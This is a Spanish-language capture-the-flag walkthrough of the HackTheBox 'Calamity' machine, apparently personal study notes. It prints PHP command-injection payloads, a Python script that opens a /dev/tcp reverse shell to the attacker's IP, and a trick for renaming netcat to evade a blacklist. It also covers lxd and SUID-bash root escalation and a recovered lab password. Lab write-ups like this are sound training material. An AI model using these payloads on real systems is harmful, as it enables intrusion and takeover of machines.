![[Pasted image 20231017183537 2.png]]

- **OS**: Linux 
- **Dificultad**: Difícil 
- **Dirección IP**: 10.129.182.234
- **Fecha**: 22/10/23

> Nunca olvides dar permisos de ejecucion con `chmod +x [file]`

![[Pasted image 20231022153505.png]]

> Consejo: Antes de usar una herramienta que haga fuerza bruta como `wfuzz` o `gobuster` u alguna otra, es mejor que *primero* hagamos fuerza bruta con `http-enum` de nmap el cual nos dara las rutas exitosas con código de estado `200`, es decir, existentes
> Esto con el objetivo de evitar saturar el servidor web con las otras herramientas

```bash 
nmap --script http-enum -p80 10.129.182.234 -oN webScan -vvv
```
![[Pasted image 20231022154044.png]]

En la pagina de `/admin.php` haciendo **Ctrl+U** no encontramos nada pero si hacemos **Ctrl+Shift+C** podemos ver texto dentro de una función del código

![[Pasted image 20231022154835.png]]

### Rervser Shell con script en bash
Interpreta código php: (para esto yo ya tengo un servidor activo en python )
```php
<?php system ("curl 10.10.14.129:81 && whoami");
```
![[Pasted image 20231022162927.png]]

fakeshell.sh 
Esto es como que el esqueleto del script 

![[Pasted image 20231022170038.png]]

Y el resultado es este:

![[Pasted image 20231022170119.png]]

Solamente lee y repite el texto introducido pero no esta conectado a nada, se tiene que adaptar 

Para poder ejecutar esto en la web, necesitamos `la cookie de sesion del usuario` ya que sin ella no podremos ejecutar nada porque necesitaremos loggeranos y no podemos hacer eso desde aqui, asi que por eso la necesitamos. 

Y así quedaría el script interactuando bien con el servidor: 
![[Pasted image 20231022174447.png]]
![[Pasted image 20231022191055.png]]
**i**
Fragmento largo:

```bash
echo; curl -s -G $main_url --data-urlencode "html=<?php system (\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo  
```

Una vez dentro asi fue como desde la bash entablamos una "reverse shell" 
![[Pasted image 20231022180017.png]]
![[Pasted image 20231024190819.png]]

![[Pasted image 20231022180030.png]]

### Reverse Shell con Script en Python 

Ahora, todo lo que hicimos, vamos a automatizarlo en un script en Python:

Al no tener éxito en la ejecución del script, lo tunelizamos a través de `BurpSuite` para ver cual es el problema

El problema es que no funcionaba bien por el `&` 
![[Pasted image 20231022184646.png]]
Asi que nos vamos al decoder de burpsuite para decoderalo 
![[Pasted image 20231022184731.png]]
Y el script quedaría de la siguiente manera: 


![[Pasted image 20231022191234.png]]
![[Pasted image 20231022190129.png]]
Fragmento largo: 
```python
#%20 es para urlencodear los espacios
    #%26 es &
    #/dev/shm = bash
    r = requests.get(mainURL + "?html=<?php%20system (\"cp%20/bin/bash%20/dev/shm/venom\");%20?>", headers=headers)
    r = requests.get(mainURL + "?html=<?php%20system (\"chmod%20+x%20/dev/shm/venom\");%20?>", headers=headers)
    r = requests.get(mainURL + "?html=<?php%20system (\"/dev/shm/venom%20-c%20'/dev/shm/venom%20-i%20>%26%20/dev/tcp/10.10.14.129/443%200>%261'\");%20?>", headers=headers, proxies=burp) 
    r = requests.get(mainURL + "?html=<?php%20system (\"cp%20/bin/bash%20/dev/shm/venom\");%20?>", headers=headers)
```

Y el resultado es el siguiente: 
![[Pasted image 20231022190210.png]]
No fue necesario entablar una  `reverse shell`
> OJO, para que funcione se necesita el sudo, pero igual sin usar sudo y nos ponemos en escucha en el puerto también funciona pero ya ahora si como una `reverse shell` 

---
Ahora hasta aquí ya tenemos 3 formas diferentes para tener una `reverse shell`
1. Reverse Shell con Script en bash (Sin usar netcat, desde la fakeshell la mandamos a nuestra maquina local)
2. Reverse Shell con Script en Python (Sin usar sudo, usando netcat)
3. Shell interactiva en Python 

---
### Tratamiento de la tty 


```bash 
script /dev/null -c bash 
CTRL + Z 
stty raw -echo; fg 
reset xterm 
export SHELL=/bin/bash 
export TERM=xterm
```

tratamiento de la tty con color:

```bash 
script /dev/null -c bash 
CTRL + Z 
stty raw -echo; fg 
reset xterm 
export SHELL=/bin/bash 
export TERM=xterm-256color && source /etc/skel/.bashrc
stty rows 24 columns 80
```

Despues ajustar filas y colunmas

`stty rows 24 columns 80`

---
### Transferencia de archivos 

En la maquina remota a un archivo `.wav` el cual es audio, para tener acceso a ella, es decir, transferirnosla hacemos los siguiente: 

> OJO, hay que tener en cuenta que la maquina victima tiene en blacklist el netcat, por lo que si lo usamos no va a funcionar
> ![[Pasted image 20231024193232.png]]

Pasamos el `netcat` a `/dev/shm` y le cambiamos el nombre a `transfer`

![[Pasted image 20231024193356.png]]
Nos ponemos en escucha de la siguiente manera:
![[Pasted image 20231024193533.png]]
Y transferimos de la siguiente manera 
![[Pasted image 20231024193618.png]]
Aquí estamos disfrazando el netcat con `/dev/shm/transfer`
Y listo. 

También lo podemos hacer con peticiones web

Nos descargamos los archivos de audio con `curl -X POST `

- escuchamos el audio
- lo invertimos 
- y nos da la siguiente contraseña en el audio  

`18547936..*`

Ahora, para ser root lo que hacemos tiene que ver con `lxd` que nos damos cuenta cuando hacemos `id`

Entonces hacemos lo siguiente

- searchsploit lxd 
- searchsploit -m lxd (copiamos la descarga con wget que nos sale ahi)
- searchsploit -m 
- cambiamos el nombre de al archivo a `lxd_privsec.sh`
- corremos el `build-alphine` para que nos cree una imagen 
- Transferimos la imagen comprimida y el script de lxd 
- le damos permisos de ejecución
- `./lxd_privsec -f [alphine...`
- Si nos da error solo comentamos esta linea
![[Pasted image 20231108171831.png]]
- Lo volvemos a correr y listo 

Lo que hace esto es crear un contendor dentro de la maquina donde al parecer por detras de va ejecutando asi que nos vamos a `/mnt/root/root/root.txt` y ahí tenemos la flag

Algo interesante es que para poder ser root, una táctica que podemos usar es modificar los permisos de `/bin/bash` que debe de ser SUID, una vez hecho esto, hacemos `bash -p`  listo

[Calamity has been Pwned!](https://www.hackthebox.com/achievement/machine/802825/37)

